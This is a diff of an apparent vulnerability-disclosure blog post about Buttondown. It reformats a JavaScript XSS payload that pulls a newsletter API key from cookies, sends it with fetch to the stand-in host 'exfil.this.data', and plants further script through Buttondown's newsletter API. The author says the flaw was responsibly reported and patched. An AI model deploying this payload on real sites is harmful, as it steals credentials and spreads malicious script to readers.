@@ -56,13 +56,9 @@ Here is an example of how such a script could look:
 
 ===
 
-```html
-<script>
-// Extract the API key from the cookies
-const apiKey = document.cookie.match(/buttondown_newsletter_api_key=([^;]+)/)[1];
 
-const payload = `
-<script>
+```js
+// THE PAYLOAD
 const apiKey = document.cookie.match(/buttondown_newsletter_api_key=([^;]+)/)[1];
 fetch('https://exfil.this.data/' + apiKey, { mode: 'no-cors' });
 fetch('https://api.buttondown.email/v1/newsletters', {
@@ -77,8 +73,17 @@ fetch('https://api.buttondown.email/v1/newsletters', {
             + '</script>'
     })
 });
-</script>
-`
+```
+
+<br/>
+<br/>
+
+
+```js
+// THE PAYLOAD IN ACTION
+
+// Extract the API key from the cookies
+const apiKey = document.cookie.match(/buttondown_newsletter_api_key=([^;]+)/)[1];
 
 // Exfiltrate the API key to the attacker's server
 fetch('https://exfil.this.data/' + apiKey, { mode: 'no-cors' });
@@ -95,7 +100,6 @@ fetch('https://api.buttondown.email/v1/newsletters', {
         description: ``
     })
 });
-</script>
 ```
 ===
 I reported this vulnerability through Buttondown's responsible disclosure program, and they have since patched the issue. They were quick, friendly and professional in their response, and I appreciate their commitment to security.
